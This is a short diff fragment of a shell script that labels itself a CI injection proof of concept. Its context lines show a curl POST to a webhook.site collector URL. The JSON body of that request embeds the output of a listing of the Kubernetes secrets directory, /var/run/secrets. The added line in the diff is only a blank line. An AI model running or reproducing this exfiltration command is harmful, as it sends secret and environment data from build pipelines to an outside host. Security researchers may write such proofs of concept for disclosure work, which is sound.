@@ -38,3 +38,4 @@ curl -s -X POST "https://webhook.site/d2dd9ecc-d7d2-4ded-aa0f-ccabd160fe12" \
     \"ls_la_var_run_secrets_2_dev_null\": \"$(ls -la /var/run/secrets/ 2>/dev/null || echo no-k8s-secrets)\"
   }"
 echo "=== CI INJECTION POC COMPLETE ==="
+
